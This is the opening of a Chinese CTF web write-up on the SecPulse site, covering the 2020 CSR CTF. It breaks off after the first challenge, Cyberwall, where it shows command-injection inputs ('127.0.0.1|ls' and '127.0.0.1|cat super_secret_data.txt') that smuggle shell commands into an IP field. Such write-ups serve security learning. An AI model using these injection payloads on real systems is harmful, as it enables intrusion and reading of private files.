<!DOCTYPE html>
<html lang="en">
    <head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
<link rel="stylesheet" type="text/css" href="https://www.secpulse.com/wp-content/themes/secpulse2017/js/Swipeslide/swipeslider.css">
<title>2020-CSR-CTF-Web-复盘以及分析 - SecPulse.COM | 安全脉搏</title>
<meta name="description" content="" />
<meta name="keywords" content="cat,CSR,CSRegex,ctf,Cyberwall,dockerfile,flask 框架,Node.JS RCE,NoSQL 盲注,Python yaml 反序列化,Web,盲注" />



    		<script type="text/javascript">
			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/72x72\/","ext":".png","source":{"concatemoji":"https:\/\/www.secpulse.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.2.2"}};
			!function(a,b,c){function d(a){var c=b.createElement("canvas"),d=c.getContext&&c.getContext("2d");return d&&d.fillText?(d.textBaseline="top",d.font="600 32px Arial","flag"===a?(d.fillText(String.fromCharCode(55356,56812,55356,56807),0,0),c.toDataURL().length>3e3):(d.fillText(String.fromCharCode(55357,56835),0,0),0!==d.getImageData(16,16,1,1).data[0])):!1}function e(a){var c=b.createElement("script");c.src=a,c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var f,g;c.supports={simple:d("simple"),flag:d("flag")},c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.simple&&c.supports.flag||(g=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",g,!1),a.addEventListener("load",g,!1)):(a.attachEvent("onload",g),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),f=c.source||{},f.concatemoji?e(f.concatemoji):f.wpemoji&&f.twemoji&&(e(f.twemoji),e(f.wpemoji)))}(window,document,window._wpemojiSettings);
		</script>
		<style type="text/css">img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
<link rel='stylesheet' id='style-css'  href='https://www.secpulse.com/wp-content/themes/secpulse2017/style.css?ver=2014.9.21' type='text/css' media='all' />
<link rel='stylesheet' id='iconfont-css'  href='https://www.secpulse.com/wp-content/themes/secpulse2017/iconfont/iconfont.css?ver=1.1' type='text/css' media='all' />
<link rel='stylesheet' id='jquery.fancybox-css'  href='https://www.secpulse.com/wp-content/themes/secpulse2017/css/jquery.fancybox.css?ver=1.0' type='text/css' media='all' />
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/secpulse2017/js/jquery-2.1.1.min.js?ver=2.15'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/secpulse2017/js/common.js?ver=1.3'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/secpulse2017/js/comments-ajax.js?ver=1.3'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/secpulse2017/js/jquery-migrate-1.2.1.js?ver=2.15'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/secpulse2017/js/jquery.qqFace.js?ver=2.15'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/secpulse2017/js/jquery.fancybox.js?ver=2.15'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/secpulse2017/js/helpers/jquery.fancybox-buttons.js?ver=2.15'></script>
<link rel='canonical' href='148890.html' />
<script type="text/javascript" src="https://www.secpulse.com/wp-content/plugins/ueditor/ueditor/third-party/SyntaxHighlighter/shCore.js"></script><link type="text/css" rel="stylesheet" href="https://www.secpulse.com/wp-content/plugins/ueditor/ueditor/third-party/SyntaxHighlighter/shCoreDefault.css" />    </head>
<body> 


<input id="home_url" type="hidden" value="https://www.secpulse.com/wp-admin/admin-ajax.php">
    <div id="header" style="position:fixed;left:0;">
        <div class="header-width-lg clearfix">
            <div class="header-logo fl">
	<a href="https://www.secpulse.com" title="安全脉搏">
		<img src="https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png" alt="">
	</a>
</div>            
            <div class="header-menu fl"><ul id="menu-%e6%96%b0%e7%89%88%e6%9c%ac2017" class="header-menu_ul"><li id="menu-item-61479" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-61479"><a  target="_blank" href="https://www.secpulse.com/">首页</a></li>
<li id="menu-item-61480" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-61480"><a  target="_blank" href="https://www.secpulse.com/archives/category/category">分类阅读</a><div class="read_hide"><ul class="dropdown-menu"><h4>脉搏文库</h4><ul class="clearfix title_top"><li id="menu-item-61484" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-61484"><a  target="_blank" href="https://www.secpulse.com/archives/category/articles/intranet-penetration">内网渗透</a></li><li><small>|</small></li>
<li id="menu-item-61483" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-61483"><a  target="_blank" href="https://www.secpulse.com/archives/category/articles/code-audit">代码审计</a></li><li><small>|</small></li>
<li id="menu-item-61485" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-61485"><a  target="_blank" href="https://www.secpulse.com/archives/category/articles/sec-doc">安全文献</a></li><li><small>|</small></li>
<li id="menu-item-61482" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-61482"><a  target="_blank" href="https://www.secpulse.com/archives/category/articles/web">Web安全</a></li><li><small>|</small></li>
<li id="menu-item-61489" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-61489"><a  target="_blank" href="https://www.secpulse.com/archives/category/articles/mobile-security">移动安全</a></li><li><small>|</small></li>
<li id="menu-item-61487" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-61487"><a  target="_blank" href="https://www.secpulse.com/archives/category/articles/system">系统安全</a></li><li><small>|</small></li>
<li id="menu-item-61486" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-61486"><a  target="_blank" href="https://www.secpulse.com/archives/category/articles/industrial-safety">工控安全</a></li><li><small>|</small></li>
<li id="menu-item-61488" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-61488"><a  target="_blank" href="https://www.secpulse.com/archives/category/exclusive/ctf-writeup">CTF</a></li><li><small>|</small></li>
<li id="menu-item-149328" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-149328"><a  target="_blank" href="https://www.secpulse.com/archives/category/iot-security">IOT安全</a></li><li><small>|</small></li>
</ul></li>
<h4>安全建设</h4><ul class="clearfix title_top"><li id="menu-item-61491" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-61491"><a  target="_blank" href="https://www.secpulse.com/archives/category/construction/businesssecurity">业务安全</a></li><li><small>|</small></li>
<li id="menu-item-61492" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-61492"><a  target="_blank" href="https://www.secpulse.com/archives/category/construction/securityissue">安全管理</a></li><li><small>|</small></li>
<li id="menu-item-61493" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-61493"><a  target="_blank" href="https://www.secpulse.com/archives/category/construction/bigdata">数据分析</a></li><li><small>|</small></li>
</ul></li>
<h4>其他</h4><ul class="clearfix title_top"><li id="menu-item-61498" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-61498"><a  target="_blank" href="https://www.secpulse.com/archives/category/news">资讯</a></li><li><small>|</small></li>
<li id="menu-item-61656" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-61656"><a  target="_blank" href="https://www.secpulse.com/archives/category/vul">漏洞</a></li><li><small>|</small></li>
<li id="menu-item-61496" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-61496"><a  target="_blank" href="https://www.secpulse.com/archives/category/tools">工具</a></li><li><small>|</small></li>
<li id="menu-item-65393" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-65393"><a  target="_blank" href="https://www.secpulse.com/archives/category/people">人物志</a></li><li><small>|</small></li>
<li id="menu-item-71704" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-71704"><a  target="_blank" href="https://www.secpulse.com/archives/category/exclusive/block_chain_security">区块链安全</a></li><li><small>|</small></li>
<li id="menu-item-74126" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-74126"><a  target="_blank" href="https://www.secpulse.com/archives/category/hiring">安全招聘</a></li><li><small>|</small></li>
</ul></li>
</ul></div></li>
<li id="menu-item-97701" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97701"><a  target="_blank" href="https://www.secpulse.com/newpage/question_list">安全问答</a></li>
<li id="menu-item-61501" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-61501"><a  target="_blank" href="https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288">金币商城</a></li>
<li id="menu-item-67532" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-67532"><a  target="_blank" href="https://www.secpulse.com/archives/category/hiring">安全招聘</a></li>
<li id="menu-item-61499" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-61499"><a  target="_blank" href="https://www.secpulse.com/newpage/activity">活动日程</a></li>
<li id="menu-item-93620" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-93620"><a  target="_blank" href="https://www.secpulse.com/live">live课程</a></li>
<li id="menu-item-61500" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-61500"><a  target="_blank" href="https://duoyinsu.com/service.html">企业服务</a></li>
<li id="menu-item-112425" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-112425"><a  target="_blank" href="https://x.secpulse.com/">插件社区</a></li>
</ul></div>            <!-- 登录头像start -->
             
                                                            <div class="user fr">
                            <a href="javascript:void(0)" class="wxchat mr20" id="wxchat">
                                <i class="iconfont icon-xiaochengxu"></i>
                                <span>小程序</span>
                                <div class="wxchat_hide">
                                    <img src="https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg" width="100%" alt="脉搏小程序"/><p>扫一扫</p><p>了解小程序</p>
                                </div>
                            </a>
                            <a href="https://www.secpulse.com/user_login">登录</a>
                            <a href="javascript:void(0);">|</a>
                            <a href="https://www.secpulse.com/user-register">注册</a>
                        </div>
                                                     
                
            <!-- 登录头像end -->
        </div>
    </div>
    <div style="height:70px"></div>
    <input id="wp_home_url" value="https://www.secpulse.com"  style="display: none;">
    <input id="template_url" value="https://www.secpulse.com/wp-content/themes/secpulse2017" style="display: none;">
            <!-- 文章详情页的返回顶部 -->
        <div class="goTop goTopComment">
            <i class="iconfont icon-fanhuidingbu blue pointer" style="bottom:115px;"></i>
            <a href="#goComment"><i class="iconfont icon-pinglun blue pointer" style="bottom:70px;"></i></a>
            <i class="iconfont icon-fanhuidingbu-copy blue pointer" style="bottom:25px;"></i>
        </div>
   <script>
$(".menu-item-has-children>a").attr("href","javascript:void(0)").attr("target","_self").css("cursor","default");
$(".menu-item-has-children").hover(function(){
    $(".read_hide").show();
},function(){
    $(".read_hide").hide();
});
$(".login_self").hover(function(){
    $(".loginout_hide").show();
    $(".loginout").text("▲");
},function(){
    $(".loginout_hide").hide();
    $(".loginout").text("▼");
});
// 返回顶部
$(function(){    
    $(function(){   
        $('.icon-fanhuidingbu').click(function(){  
            $('body,html').animate({scrollTop:0},500);  
            return false;                   
        }) 
        $(".icon-fanhuidingbu-copy").click(function(){
            // console.log(document.body.clientHeight)
            // console.log(document.body.offsetHeight)
            $("html,body").animate({
                scrollTop: document.body.offsetHeight},500);
            return false; 
        })        
    })      
// 上拉显示导航栏 下拉隐藏
    var cubuk_seviye = $(document).scrollTop();  
    var header_yuksekligi = $('#header').outerHeight();    
    $(window).scroll(function() {  
        var kaydirma_cubugu = $(document).scrollTop();  
  
        if (kaydirma_cubugu > header_yuksekligi){$('#header').addClass('gizle');}   
        else {$('#header').removeClass('gizle');}  
  
        if (kaydirma_cubugu > cubuk_seviye){$('#header').removeClass('sabit');}   
        else {$('#header').addClass('sabit');}                  
  
        cubuk_seviye = $(document).scrollTop();   
     });  
});
$(".nav_small .icon-nav").on("click",function(){
    var $list =$(".nav_small_list");
    if($list.css('display') == 'none'){
        $list.slideDown();
    }else{
        $list.slideUp();
    }  
})
$(".nav_read_click").on("click",function(){
    var $readList =$(".nav_small_list_read");
    if($readList.css('display') == 'none'){
        $readList.slideDown();
    }else{
        $readList.slideUp();
    }
})
</script>



<link rel="stylesheet" type="text/css" href="https://www.secpulse.com/wp-content/themes/secpulse2017/fonts/font-awesome-4.5.0/css/font-awesome.min.css" />
<link rel="stylesheet" type="text/css" href="https://www.secpulse.com/wp-content/themes/secpulse2017/css/icons.css" />
<style>/*活动详情页*/
#detail_main{max-width:100%;width:1200px;margin:15px auto 0;}
.left-9{max-width:100%;width:840px;word-wrap:break-word;border-radius:5px;}
.left-9-article{max-width:100%;width:840px;background: #fff;padding:25px 20px 80px;position:relative;border-radius:5px;margin:0 auto;}
.left-9 .wrap-title h1{font-size:22px;margin-top:5px;line-height:2;color:#297bc7;}
.left .writer img{vertical-align:middle;}
.right-3{width:335px;}
.right-3 .tr0 a.blue:hover{color:#297bc7!important;}
.left-9-code code,#detail_main .left-9-code pre{display: block;background-color:#F0F0F0;padding:8px;margin:15px 0;line-height:18px;border-radius:3px;font-size:13px;}
.left-9-code code{display:inline-block}
.left-9-code blockquote {display:block;border:1px solid #00afef;border-left:3px solid #00afef;background:#F8FAFB;border-radius:3px;padding:2px 8px;margin:10px 5px;line-height: 1.4;font-size: 100%;}
.left-9-code small{display:inline-block;border:1px solid #ddd;background:#FFFDF6;border-radius:3px;padding:0 4px;margin:0 5px;line-height:1.4;font-size:100%;}
.left-9-code a{text-decoration:underline !important;}
.left-9-code h2{font-size:20px;margin: 20px 0px 15px 0px!important;padding-left:8px;border-left:3px solid #548DD4;color:#548DD4;}
.left-9-code h2>span{font-size:20px!important;}
.single-meta{width:100%;margin:12px 0 15px;color:#5b5b5b;font-size:14px;line-height:25px;display:inline-block;}
.single-meta .writer a{color:rgba(0,0,0,.8);}
.single-meta .tag a{color:rgba(0,0,0,.8);}
.single-meta i{display:inline-block;}
.single-meta a:hover,.single-meta .writer a:hover{color:#297bc7;}
.content{border-left:3px solid #ddd;margin:0 0 20px 20px;padding-left:10px;}
.left-9 table{border-collapse:collapse;max-width:100%!important;}
.left-9 table th,#detail_main .left-9 table td{word-break:break-all;word-wrap:break-word;white-space:pre-wrap;text-align: center;border:1px solid #ccc;padding:3px 5px;}
/* .left-9-code section,.left-9-code img,.left-9-code table{max-width:100%!important;border:1px solid #eee;} */
.left-9-code img,.left-9-code table{max-width:100%!important;border:1px solid #eee;}
.left-9-code ol,.left-9-code ul{margin-left:40px;}
.left-9-code li{margin:0 !important;}
.left-9-code p{line-height:1.8!important;font-size:16px!important;}
.left-9>p{font-size:16px;margin: 0 0 1rem;line-height:1.9;}
.left-9 ol li{font-size:16px;margin:0 0 1rem;line-height:1.9;}
.left-9 ol li .icobutton:hover{color:#297bc7;}
.content p{font-size: 16px;text-indent:2rem;margin:8px 0;}
.content a{color:#EF5B64;display:inline-block;margin:.3em 0;font-size:18px;}
table{width:100%;text-align:center;margin-bottom:25px;background:#fff;padding:15px;border-radius:5px;}
.img{width:60px;height:60px;margin-right:12px;border-radius:50%;border:2px solid #297bc7;}
table .tr1{color:#5b5b5b;}
table .tr1 span{display:inline-block;color:#5b5b5b;margin-bottom:0px;}
.left-9>img{width:90%;margin:20px 5%;}
.right-3 .banner-img{display:block;width:100%;margin:15px 0;position:relative;}
.right-3 .banner-img .img-wrp{width:100%;height:125px;background:#000;opacity:.3;position:absolute;}
.right-3 .banner-img img{width:100%;height:125px;}
.right-3 .img-meta{width:calc(100% - 30px);color:#fff;padding:8px 15px;position:absolute;bottom:0;right:0;}
.right-3 .img-meta p{width:100%;font-size:15px;color:#fff;overflow:hidden;white-space:nowrap;text-overflow:ellipsis;font-size:16px;color:#fff;}
.left-9-icon{max-width:100%;width:840px;height:50px;line-height:50px;padding:0 20px;background:#fff;z-index:999999;box-shadow:0 -1px 3px rgba(26,26,26,.1);position:absolute;bottom:0;margin-left:-20px;}
.isfixed{position:fixed;bottom:0;}
#detail_main .left-9-icon a{margin-right:20px;font-size:14px;color:#5b5b5b;}
#detail_main .icon-left a:hover{color:#297bc7;}
.left-9-icon i{font-size:14px;margin-right:3px;}
.left-9-icon .icon-left{position:absolute;bottom:0;}
.left-9-icon .icon-right{position:absolute;right:0px;bottom:0;}
.icon-fenxiang1{display:inline-block;width:40px;}
.icon-jifen{color:#297bc7;}
.icon-jinbi{color:#F9B721;}
.comment{width:840px;max-width:100%;margin:20px 0;overflow:hidden;background:#fff;padding:20px;border-radius:5px;}
.comment-num{font-size:19px;font-weight:700;}
.comment-num span{font-size:19px;font-weight:700;}
.comment-icon i{font-size:21px;display:inline-block;margin-right:8px;transform:translateY(1px);}
.comment .input-text{width:calc(98% - 2px);height:40px;line-height:40px;padding-left:2%;margin:10px 0;border:1px solid #dadbdb;border-radius:5px;}
#detail_main .wrap-textarea{display:none;width:calc(100% - 2px);border:1px solid #297bc7;border-radius:5px;margin:15px 0;}
#detail_main .wrap-textarea textarea{width:100%;min-height:70px;max-height:500px;padding:1% 2%;border:none;background:transparent;font-size:14px;border-bottom:1px solid #297bc7;overflow:hidden;line-height: 28px;color:#333;}
.tijiao{position:relative;padding:2px 20px;}
.tijiao span{font-size:21px;display:inline-block;margin-right:10px;}
.tijiao input{background:#297bc7;color:#fff;border:none;outline:none;font-weight:700;padding:1px 13px;border-radius:5px;margin-top:3px;font-size:16px;}
.comment-real-l{width:65px;}
.comment-real-r{width:calc(100% - 65px);}
.comment-real-r .meta-center p img{max-width:70% !important;}
.comment-real-r a{color:#297bc7;}
.comment-real-r .meta-top span{font-weight:600;line-height:30px;color:#b1b1b1;}
.comment-real-r .meta-top span.blue:hover{color:#0f487d !important;}
.comment-real-r .meta-center{margin:10px 0;}
.comment-real-r .meta-center p{color:#333;line-height:22px;word-break:break-all;}
.comment-real-r .meta-bot{margin-bottom:20px;}
.comment-real-r .meta-bot a{display: inline-block;color:#d1d1d1;}
.comment-real-r .meta-bot a:hover{color:#297bc7;}
.comment-real-r .meta-bot .replay:hover{color:#0f487d !important;}
.comment-real-l img{width:55px;height:55px;border-radius:50%;}
.comment-real li{margin:25px 0;}
.shareMenu{display:none;width:136px;height:150px;padding:10px 0px 20px 20px;background:#fff;box-shadow:0 5px 20px rgba(26,26,26,.1);position:absolute;top:-150px;left:-100px;}
.shareMenu a{display:block;line-height:40px;color:#8590a6;}
.shareMenu a:hover{color:#297bc7!important;}
.shareMenu:before{position: absolute;display: inline-block;left:100px;top: 144px;width: 0;height: 0px;content: '';border-style: solid;border-width: 6px;border-color: #fff #fff transparent transparent;transform: rotate(135deg);box-shadow: 2px -2px 2px rgba(26,26,26,.1);}
#detail_main img{max-width:90%!important;max-height:90%!important;margin:10px 0;}
</style>
<div id="detail_main">
		<div class="left-9 fl">
      <div class="left-9-article">	
        <div class="wrap-title" style="width:100%;position:relative;">
    				<h1>2020-CSR-CTF-Web-复盘以及分析</h1>
        </div>
  			<div class="single-meta">
  				<div class="left fl">
  					<span class="tag mr20"><a href="https://www.secpulse.com/archives/category/articles/web">Web安全</a></span>
  					<span class="writer">
              <a href="https://www.secpulse.com/newpage/author?author_id=37244" class="writer_small">合天网安实验室</a>
  						              						<a href="javascript:void(0)" title="企业认证">
              							<img style="width:15px;" src="https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng2.png" alt="">
              						</a>
          						  					</span>
  				</div>
  				<div class="right fr" style="font-size:12px;">
  					<i class="iconfont icon-iconfont11"></i>
  					<span class="time mr20">2020-12-08</span>
  					<i class="iconfont icon-browse"></i>
  					<span class="browse">8,283</span>
  				</div>
  				<div class="clearfix"></div>
  			</div>

  		 	<div class="left-9-code">
  				<section style="margin: 10px auto;max-width: 100%;font-family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;color: black;font-size: 16px;background-color: rgb(255, 255, 255);text-align: center;box-sizing: border-box !important;overflow-wrap: break-word !important;">
<section style="max-width: 100%;display: inline-block;box-sizing: border-box !important;overflow-wrap: break-word !important;">
<section style="max-width: 100%;display: flex;justify-content: center;align-items: center;box-sizing: border-box !important;overflow-wrap: break-word !important;">
<section style="max-width: 100%;display: flex;justify-content: center;align-items: center;flex-shrink: 0;flex-direction: row-reverse;box-sizing: border-box !important;overflow-wrap: break-word !important;">
<section style="max-width: 100%;overflow-wrap: break-word;width: 35px;flex-shrink: 0;box-sizing: border-box !important;"><br/></section>
</section>
</section>
</section>
</section>
<h1 style="box-sizing: border-box;margin-top: 30px;margin-bottom: 15px;color: rgb(0, 0, 0);font-weight: bold;font-size: 24px;font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><span style="background-color: #3DAAD6;color: #FFFFFF;"><strong><span style="background-color: #3DAAD6;font-size: 15px;box-sizing: border-box;">0x01 前言</span></strong></span><span style="font-size: 15px;box-sizing: border-box;"></span></h1>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: rgb(0, 0, 0);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 15px;">2020 年 10 月 31 日万圣节举办的德国比赛，界面很有特色，web 题目质量很高，队伍只出了三道，结束后通通复盘了一遍深入理解。题目从易到难一共有十道，其中九道有出，本篇只详细分析解数多的五道，其余四道比赛时只有个位数 solve ，打算后续专门写四篇结合相应漏洞讲述。</span></p>
<p style="box-sizing: border-box;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: rgb(0, 0, 0);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><strong><span style="font-size: 15px;color: #3DAAD6;">本文涉及靶场知识点练习：</span></strong></p>
<p style="box-sizing: border-box;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: rgb(0, 0, 0);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 15px;">CTF实验室（复制链接或者点击阅读原文开始体验）</span></p>
<p style="box-sizing: border-box;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: rgb(0, 0, 0);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 15px;">https://www.hetianlab.com/pages/CTFLaboratory.jsp?pk_campaign=weixin-wemedia</span></p>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: rgb(0, 0, 0);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><strong><span style="font-size: 15px;color: #3DAAD6;">本篇相关亮点：</span></strong></p>
<ul style="margin-top: 8px;margin-bottom: 8px;padding-left: 25px;color: rgb(0, 0, 0);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;font-size: 16px;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);" class=" list-paddingleft-2">
<li>
<section style="box-sizing: border-box;margin-top: 5px;margin-bottom: 5px;line-height: 26px;color: rgb(1, 1, 1);"><span style="font-size: 15px;">Python yaml 反序列化</span></section>
</li>
<li>
<section style="box-sizing: border-box;margin-top: 5px;margin-bottom: 5px;line-height: 26px;color: rgb(1, 1, 1);"><span style="font-size: 15px;">Node.JS RCE</span></section>
</li>
<li>
<section style="box-sizing: border-box;margin-top: 5px;margin-bottom: 5px;line-height: 26px;color: rgb(1, 1, 1);"><span style="font-size: 15px;">NoSQL 盲注</span></section>
</li>
</ul>
<h1 style="box-sizing: border-box;margin-top: 30px;margin-bottom: 15px;color: rgb(0, 0, 0);font-weight: bold;font-size: 24px;font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><span style="color: #FFFFFF;background-color: #3DAAD6;"><strong><span style="background-color: #3DAAD6;color: #FFFFFF;font-size: 15px;box-sizing: border-box;">0x02 题解</span></strong></span></h1>
<h2 style="box-sizing: border-box;margin-top: 30px;margin-bottom: 15px;color: rgb(0, 0, 0);font-weight: bold;font-size: 22px;font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><strong><span style="font-size: 15px;box-sizing: border-box;color: #3DAAD6;">Cyberwall</span></strong></h2>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: rgb(0, 0, 0);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 15px;">开胃小菜。</span></p>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: rgb(0, 0, 0);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 15px;">网页源码有密码可登入。</span></p>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: rgb(0, 0, 0);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 15px;">路由 debug 命令注入。</span></p>
<pre style="box-sizing: border-box;font-size: 16px;font-family: SFMono-Regular, Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;margin-top: 10px;margin-bottom: 10px;overflow: auto;border-radius: 5px;box-shadow: rgba(0, 0, 0, 0.55) 0px 2px 10px;color: rgb(0, 0, 0);text-align: left;background-color: rgb(255, 255, 255);"><code style="box-sizing: border-box;font-size: 12px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;display: -webkit-box;overflow-x: auto;padding: 15px 16px 16px;color: rgb(51, 51, 51);background: rgb(248, 248, 248);border-radius: 5px;">127.0.0.1|ls<br style="box-sizing: border-box;"/></code></pre>
<p style="text-align: center;"><img class="rich_pages" style="" src="https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-148890-1607395265.png"/></p>
<pre style="box-sizing: border-box;font-size: 16px;font-family: SFMono-Regular, Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;margin-top: 10px;margin-bottom: 10px;overflow: auto;border-radius: 5px;box-shadow: rgba(0, 0, 0, 0.55) 0px 2px 10px;color: rgb(0, 0, 0);text-align: left;background-color: rgb(255, 255, 255);"><code style="box-sizing: border-box;font-size: 12px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;display: -webkit-box;overflow-x: auto;padding: 15px 16px 16px;color: rgb(51, 51, 51);background: rgb(248, 248, 248);border-radius: 5px;">127.0.0.1|cat&nbsp;super_secret_data.txt<br style="box-sizing: border-box;"/></code></pre>
<h2 style="box-sizing: border-box;margin-top: 30px;margin-bottom: 15px;color: rgb(0, 0, 0);font-weight: bold;font-size: 22px;font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><strong><span style="box-sizing: border-box;font-size: 15px;">Wheels n Whales</span></strong><span style="box-sizing: border-box;font-size: 15px;"></span></h2>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: rgb(0, 0, 0);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 15px;">给了源码</span></p>
